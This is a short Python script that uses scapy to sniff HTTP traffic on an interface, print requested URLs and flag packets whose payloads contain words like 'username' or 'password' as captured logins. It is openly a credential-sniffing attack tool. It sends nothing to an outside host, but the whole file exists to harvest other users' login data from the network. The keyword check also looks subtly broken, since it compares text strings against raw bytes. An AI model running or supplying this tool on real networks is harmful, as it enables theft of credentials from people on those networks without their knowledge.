import scapy.all as scapy
from scapy.layers import http
from typing import Optional

def start_sniffing(interface: str) -> None:
    try:
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    except Exception as e:
        print(f"An error occurred while sniffing packets: {e}")

def get_url(packet: scapy.Packet) -> Optional[str]:
    if http.HTTPRequest in packet:
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return None
    
def get_login_info(packet: scapy.Packet) -> Optional[str]:
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = {'username', 'user', 'login', 'password', 'pass'}
        for keyword in keywords:
            if keyword in load:
                return load
    return None
            
def process_sniffed_packet(packet: scapy.Packet) -> None:
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if url:
            print(f"[+] HTTP Request >> {url}")
        
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password > {login_info}\n\n")

start_sniffing('eth0')
